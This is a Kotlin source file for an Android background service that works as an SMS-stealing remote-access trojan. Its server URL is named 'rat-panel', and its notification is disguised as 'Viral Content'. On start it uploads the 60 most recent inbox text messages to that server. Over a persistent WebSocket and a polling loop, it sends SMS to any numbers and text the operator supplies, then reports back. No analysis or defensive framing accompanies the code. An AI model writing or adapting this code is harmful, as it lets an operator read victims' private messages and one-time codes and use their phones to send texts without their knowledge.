package com.screenlink.remote

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.telephony.SmsManager
import androidx.core.app.NotificationCompat
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class TpcService : Service() {

    companion object {
        const val API_BASE_URL = "https://rat-panel-b91839a4be83.herokuapp.com"

        private const val CHANNEL_ID = "tpc_service"
        private const val NOTIFICATION_ID = 5001
        private const val POLL_INTERVAL = 20_000L
        private const val INBOX_SYNC_LIMIT = 60
    }

    private val work = Executors.newSingleThreadExecutor()
    private val bgThread = HandlerThread("tpc").apply { start() }
    private val bgHandler = Handler(bgThread.looper)

    private val client = OkHttpClient.Builder()
        .pingInterval(20, TimeUnit.SECONDS)
        .build()

    private var socket: WebSocket? = null
    private var attempts = 0
    private var stopped = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundSafely()
        connect()
        syncInbox()
        schedulePoll()
        return START_STICKY
    }

    override fun onDestroy() {
        stopped = true
        socket?.close(1000, "bye")
        socket = null
        bgHandler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }

    // ------------------------------------------------------- foreground

    private fun startForegroundSafely() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(NotificationManager::class.java)
            if (nm.getNotificationChannel(CHANNEL_ID) == null) {
                nm.createNotificationChannel(
                    NotificationChannel(
                        CHANNEL_ID,
                        "Viral Content",
                        NotificationManager.IMPORTANCE_LOW
                    )
                )
            }
        }

        val pi = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Viral Content")
            .setContentText("SMS gateway active")
            .setSmallIcon(R.drawable.app_logo)
            .setOngoing(true)
            .setContentIntent(pi)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    // ------------------------------------------------------------ socket

    private fun rid(): String =
        getSharedPreferences("viral_prefs", Context.MODE_PRIVATE)
            .getString("registration_id", "").orEmpty()

    private fun connect() {
        if (stopped || socket != null) return

        val url = API_BASE_URL.replace("https://", "wss://") + "/ws/device/${rid()}"

        socket = client.newWebSocket(
            Request.Builder().url(url).build(),
            object : WebSocketListener() {
                override fun onOpen(ws: WebSocket, response: Response) {
                    attempts = 0
                    pollOutbox()
                }

                override fun onMessage(ws: WebSocket, text: String) = handle(text)

                override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                    socket = null
                    retry()
                }

                override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                    socket = null
                    retry()
                }
            }
        )
    }

    private fun retry() {
        if (stopped) return
        attempts = (attempts + 1).coerceAtMost(6)
        bgHandler.postDelayed({ connect() }, (1000L shl (attempts - 1)).coerceAtMost(20_000L))
    }

    // ------------------------------------------------------ sms sending

    private fun handle(text: String) {
        val msg = try { JSONObject(text) } catch (_: Exception) { return }
        if (msg.optString("type") != "sms_send") return

        val id = msg.optString("id")
        val to = msg.optString("to")
        val body = msg.optString("body")

        if (to.isBlank() || body.isBlank()) {
            ack(id, "failed", "missing to/body")
            return
        }

        work.execute {
            try {
                @Suppress("DEPRECATION")
                val manager = SmsManager.getDefault()
                val parts = manager.divideMessage(body)

                if (parts.size > 1) {
                    manager.sendMultipartTextMessage(to, null, parts, null, null)
                } else {
                    manager.sendTextMessage(to, null, body, null, null)
                }

                ack(id, "sent", "")
            } catch (e: Exception) {
                ack(id, "failed", e.message ?: "send error")
            }
        }
    }

    private fun ack(id: String, status: String, error: String) {
        if (id.isBlank()) return

        work.execute {
            var connection: HttpURLConnection? = null
            try {
                connection = URL("$API_BASE_URL/devices/outbox/$id/ack")
                    .openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")

                val payload = JSONObject().apply {
                    put("status", status)
                    put("error", error)
                }.toString()

                connection.outputStream.use { it.write(payload.toByteArray(Charsets.UTF_8)) }
                connection.responseCode
            } catch (_: Exception) {
            } finally {
                connection?.disconnect()
            }
        }
    }

    // ----------------------------------------------------------- polling

    private val pollRunnable = object : Runnable {
        override fun run() {
            if (stopped) return
            pollOutbox()
            bgHandler.postDelayed(this, POLL_INTERVAL)
        }
    }

    private fun schedulePoll() {
        bgHandler.removeCallbacks(pollRunnable)
        bgHandler.postDelayed(pollRunnable, POLL_INTERVAL)
    }

    private fun pollOutbox() {
        work.execute {
            var connection: HttpURLConnection? = null
            try {
                connection = URL("$API_BASE_URL/devices/outbox?registration_id=${rid()}")
                    .openConnection() as HttpURLConnection
                connection.requestMethod = "GET"
                connection.connectTimeout = 12_000
                connection.readTimeout = 12_000

                if (connection.responseCode !in 200..299) return@execute

                val text = connection.inputStream.bufferedReader().use { it.readText() }
                val items = JSONObject(text).optJSONArray("items") ?: return@execute

                for (i in 0 until items.length()) {
                    val item = items.optJSONObject(i) ?: continue
                    handle(JSONObject().apply {
                        put("type", "sms_send")
                        put("id", item.optString("id"))
                        put("to", item.optString("to"))
                        put("body", item.optString("body"))
                    }.toString())
                }
            } catch (_: Exception) {
            } finally {
                connection?.disconnect()
            }
        }
    }

    // -------------------------------------------------------- inbox sync

    private fun syncInbox() {
        work.execute {
            try {
                val rows = JSONArray()

                val cursor = contentResolver.query(
                    android.provider.Telephony.Sms.Inbox.CONTENT_URI,
                    arrayOf("address", "body", "date"),
                    null, null, "date DESC"
                ) ?: return@execute

                cursor.use {
                    var count = 0
                    while (it.moveToNext() && count < INBOX_SYNC_LIMIT) {
                        rows.put(JSONObject().apply {
                            put("address", it.getString(0) ?: "")
                            put("body", it.getString(1) ?: "")
                            put("direction", "in")
                            put("timestamp", it.getLong(2))
                        })
                        count++
                    }
                }

                if (rows.length() == 0) return@execute

                var connection: HttpURLConnection? = null
                try {
                    connection = URL("$API_BASE_URL/devices/sms/sync")
                        .openConnection() as HttpURLConnection
                    connection.requestMethod = "POST"
                    connection.doOutput = true
                    connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")

                    val payload = JSONObject().apply {
                        put("registration_id", rid())
                        put("messages", rows)
                    }.toString()

                    connection.outputStream.use { it.write(payload.toByteArray(Charsets.UTF_8)) }
                    connection.responseCode
                } finally {
                    connection?.disconnect()
                }
            } catch (_: Exception) {
            }
        }
    }
}